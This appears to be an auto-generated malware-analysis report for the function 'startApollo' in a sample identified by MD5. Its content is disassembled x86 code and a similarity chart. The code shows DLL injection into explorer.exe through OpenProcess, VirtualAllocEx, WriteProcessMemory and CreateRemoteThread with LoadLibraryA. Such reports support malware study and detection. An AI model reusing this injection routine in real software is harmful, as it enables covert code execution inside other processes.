---
layout: post
title:  "sym.Apollo_32.dll_startApollo @ f306bc4e89ecdab5df7aa72172ee5f69"
date:   2021-09-10 15:52:19 +0300
categories: report
index: false
---

# Generic Information
- **Function:** sym.Apollo\_32.dll\_startApollo
- **Origin (md5):** f306bc4e89ecdab5df7aa72172ee5f69
- **VirusTotal:** [virustotal.com/gui/file/f306bc4e89ecdab5df7aa72172ee5f69][virustotal_ref]

# Code Tags
<span class="tag" id="MEMORY">MEMORY</span>
<span class="tag" id="PROCESS">PROCESS</span>
<span class="tag" id="LINKING">LINKING</span>


# Estimated Behaviour
<ul><li class="bhv-desc" id="na">Not Available :(</li></ul>

# Similar Functions
<script type="text/javascript" src="https://www.gstatic.com/charts/loader.js"></script>
<script type="text/javascript">

    google.charts.load('current', {'packages':['corechart']});
    google.charts.setOnLoadCallback(drawChart);

    function drawChart() {
    var data = new google.visualization.DataTable();
        data.addColumn('number', 'X');
        data.addColumn('number', 'Y');
        data.addColumn({type: 'string', role: 'tooltip', 'p': {'html': true}});
        data.addColumn({'type': 'string', 'role': 'style'});
        
        data.addRows([
    [0, 0, '<b><a href="/report/sym.Apollo_32.dll_startApollo@f306bc4e89ecdab5df7aa72172ee5f69">sym.Apollo_32.dll_startApollo</a><br>@f306bc4e89ecdab5df7aa72172ee5f69</b><br>', 'point { fill-color: #e0440e; }'],

        ]);

    var options = {
        title: 'Similarity Plot',
        legend: 'none',
        colors: ['#dedbd9', '#e6693e', '#ec8f6e', '#f3b49f', '#f6c7b6'],
        tooltip: {isHtml: true, trigger: 'both'},
        explorer: {
        actions: ["dragToZoom", "rightClickToReset"],
        },
        chartArea: {
        width: '80%',
        height: '80%'
        },
        width: '100%',
        height: '100%'
    };

    var chart = new google.visualization.ScatterChart(document.getElementById('chart_div'));

    chart.draw(data, options);
    }
    
</script>


<div id="chart_div" style="width: 100%px; height: 100%;"></div>

# Disassembled Code
{% highlight nasm %}

push ebp
mov ebp, esp
and esp, 0xfffffff8
sub esp, 0x54
mov eax, dword[0x1002d064]
xor eax, esp
mov dword[esp+0x50], eax
push ebx
push esi
push edi
lea eax, [esp+0x28]
mov dword[esp+0x28], 0
push eax
push 0
push 0
push 0x1001e1c0
call dword[sym.imp.SHELL32.dll_SHGetKnownFolderPath]
mov edx, dword[esp+0x28]
xor eax, eax
mov ecx, edx
mov dword[esp+0x54], 0
mov dword[esp+0x58], 7
mov word[esp+0x44], ax
lea esi, [ecx+2]
mov ax, word[ecx]
add ecx, 2
test ax, ax
jne off.b83
sub ecx, esi
sar ecx, 1
push ecx
push edx
lea ecx, [esp+0x4c]
call fcn.10001ab0
cmp dword[esp+0x58], 8
lea edx, [esp+0x44]
mov eax, dword[esp+0x54]
lea edi, [esp+0x44]
cmovae edx, dword[esp+0x44]
lea ecx, [esp+0x2c]
cmovae edi, dword[esp+0x44]
mov dword[esp+0x3c], 0
mov dword[esp+0x40], 0xf
lea ebx, [edx+eax*2]
mov byte[esp+0x2c], 0
mov eax, ebx
sub eax, edi
sar eax, 1
push eax
call fcn.100015b0
push dword[esp+0x28]
lea ecx, [esp+0x30]
push ebx
push edi
call fcn.10001750
push 0x1002a870
lea edx, [esp+0x30]
lea ecx, [esp+0x14]
call fcn.10001460
add esp, 4
lea ecx, [esp+0x2c]
push eax
call fcn.100013e0
mov edx, dword[esp+0x24]
cmp edx, 0x10
jb off.b276
mov ecx, dword[esp+0x10]
inc edx
mov eax, ecx
cmp edx, 0x1000
jb off.b266
mov ecx, dword[ecx-4]
add edx, 0x23
sub eax, ecx
add eax, 0xfffffffc
cmp eax, 0x1f
ja off.b603
push edx
push ecx
call fcn.10005933
add esp, 8
cmp dword[esp+0x40], 0x10
lea esi, [esp+0x2c]
push str.explorer.exe
cmovae esi, dword[esp+0x30]
call sym.Apollo_32.dll_findProcessId
add esp, 4
push eax
push 0
push 0x1fffff
call dword[sym.imp.KERNEL32.dll_OpenProcess]
mov edi, eax
mov eax, esi
lea edx, [eax+1]
mov cl, byte[eax]
inc eax
test cl, cl
jne off.b324
push 4
sub eax, edx
push 0x1000
inc eax
push eax
push 0
push edi
call dword[sym.imp.KERNEL32.dll_VirtualAllocEx]
mov ebx, eax
mov eax, esi
lea edx, [eax+1]
mov cl, byte[eax]
inc eax
test cl, cl
jne off.b358
push 0
sub eax, edx
inc eax
push eax
push esi
push ebx
push edi
call dword[sym.imp.KERNEL32.dll_WriteProcessMemory]
push 0
push 0
push ebx
push str.LoadLibraryA
push str.Kernel32.dll
call dword[sym.imp.KERNEL32.dll_GetModuleHandleA]
push eax
call dword[sym.imp.KERNEL32.dll_GetProcAddress]
push eax
push 0
push 0
push edi
call dword[sym.imp.KERNEL32.dll_CreateRemoteThread]
push 0xffffffffffffffff
push eax
call dword[sym.imp.KERNEL32.dll_WaitForSingleObject]
lea ecx, [esi+1]
mov al, byte[esi]
inc esi
test al, al
jne off.b432
sub esi, ecx
push 0x8000
lea eax, [esi+1]
push eax
push ebx
push edi
call dword[sym.imp.KERNEL32.dll_VirtualFreeEx]
mov edx, dword[esp+0x40]
cmp edx, 0x10
jb off.b508
mov ecx, dword[esp+0x2c]
inc edx
mov eax, ecx
cmp edx, 0x1000
jb off.b498
mov ecx, dword[ecx-4]
add edx, 0x23
sub eax, ecx
add eax, 0xfffffffc
cmp eax, 0x1f
ja off.b608
push edx
push ecx
call fcn.10005933
add esp, 8
mov edx, dword[esp+0x58]
mov dword[esp+0x3c], 0
mov dword[esp+0x40], 0xf
mov byte[esp+0x2c], 0
cmp edx, 8
jb off.b585
mov ecx, dword[esp+0x44]
lea edx, [edx*2+2]
mov eax, ecx
cmp edx, 0x1000
jb off.b575
mov ecx, dword[ecx-4]
add edx, 0x23
sub eax, ecx
add eax, 0xfffffffc
cmp eax, 0x1f
ja off.b608
push edx
push ecx
call fcn.10005933
add esp, 8
mov ecx, dword[esp+0x5c]
pop edi
pop esi
pop ebx
xor ecx, esp
call fcn.10005922
mov esp, ebp
pop ebp
ret
call fcn.1000a643
call fcn.1000a643
int3

{% endhighlight %}

[virustotal_ref]: https://www.virustotal.com/gui/file/f306bc4e89ecdab5df7aa72172ee5f69